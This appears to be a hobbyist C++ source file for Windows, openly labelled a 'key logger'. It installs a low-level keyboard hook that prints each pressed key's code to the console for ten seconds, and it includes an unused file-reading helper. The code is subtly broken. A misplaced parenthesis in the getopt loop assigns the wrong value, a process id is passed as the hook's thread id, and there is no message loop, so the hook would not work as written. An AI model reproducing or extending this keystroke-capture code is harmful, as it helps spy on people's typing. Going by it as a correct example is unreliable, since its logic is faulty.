#include<iostream>
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>


using namespace std;


// <CR> Carrage-Return,
// <LF> Line-Feed
// <CR> == '\n' if os == unix like
// <CR> == '\r\n' if os == windows
// '\r' == ^M if editor == 'vim'


HHOOK _hook;
KBDLLHOOKSTRUCT _kbdllhook;
int _pid;

LRESULT __stdcall HookCallback(int code, WPARAM wparam, LPARAM lparam)
{
	if (code >=0 && wparam == WM_KEYDOWN) {
		_kbdllhook = *((KBDLLHOOKSTRUCT*)lparam);
		cout << "key code: " << _kbdllhook.vkCode << endl;
	}
	
	cout << "key code: " << code << endl;
	return CallNextHookEx(_hook, code, wparam, lparam);

}
void SetHook() 
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, _pid)))
	{
		DWORD err = GetLastError();
		cout << "hook failed, code: " << std::to_string(err) << endl;
		exit(1);
	}										
}

void ReleaseHook() {
	UnhookWindowsHookEx(_hook);
}



void ReadFileContent(LPCSTR filePath) {
	HANDLE file = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) { return; }

	DWORD bytesRead;
	char buffer[1024];
	ReadFile(file, buffer, sizeof(buffer), &bytesRead, NULL);
	std::cout << buffer << endl;
	CloseHandle(file);
}


const char *opt_str = "p:d"; 
int main(int argc,  char *argv[]) {
//	cout << "windows" << endl;
//	
//	LPCSTR path = "C:/Users/zqshe/AppData/Roaming/Factorio/mods/fire-armor/0";
//	ReadFileContent(path);
//
	
	int opt;
	cout << opt_str << endl;
	while((opt = getopt(argc, argv, opt_str) != -1)) {
			printf("opt: %c\n", opt);
			printf("optarg: %s\n", optarg);
			_pid = atoi(optarg);
	}
	if (!_pid) { cout << "pid input error.  " << endl; }
	cout << "32: " << std::to_string(atoi("32")) << endl;
	
	cout << "key logger start...." << endl;
	cout << "hook reject into " << std::to_string(_pid) << endl;
	
	
	SetHook();
	Sleep(10 * 1000);
	ReleaseHook();
	
	return 0;
}
